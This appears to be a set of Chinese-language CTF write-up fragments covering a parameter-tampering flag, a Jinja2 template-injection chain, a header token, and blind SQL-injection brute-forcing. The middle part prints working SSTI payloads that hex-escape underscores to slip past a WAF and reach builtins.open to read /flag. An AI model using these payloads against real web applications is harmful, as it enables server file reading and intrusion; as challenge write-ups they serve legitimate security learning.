...
不过抓flag.php兑换flag的包发现post传参`check=no`

改成`check=yes`就拿到flag了
...
我先测了 {{url\_for}}，能正常回显，说明它可以当跳板。

然后用 attr 过滤器去读它的 **globals**：

{{url\_for|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}  
这里的 \\x5f 是下划线 \_，作用是避免在原始输入里直接出现 **globals** 这种明显特征。

这里返回的是一个全局字典，里面直接有 sys，于是可以走：

{{(url\_for|attr('\\x5f\\x5fglobals\\x5f\\x5f'))\['sys'\]}}

再用 sys.modules 拿已经加载的模块。这里我不走 os.popen，因为 WAF 会拦 popen 相关链路。  
最终选择 builtins.open

{{(url\_for|attr('\\x5f\\x5fglobals\\x5f\\x5f'))\['sys'\].modules\['builtins'\]|attr('open')('/flag')|attr('read')()}}
...
使用`X-Vought-Token: Homelander`访问
...
爆破到第一个`a`，由于payload中有数字，依旧满足`'404' not in re.text:`，最后输出就会变成0aaaaaaaaaaaaaaaaa
...
我们的预期回显是`id,member,keyword`

但是这个payload判断的是exists

按照字母顺序，a%匹配字段首字母，轮到i的时候匹配到了id

但是我们用的是`COLUMN_NAME LIKE=`来匹配，只匹配单个列的列名
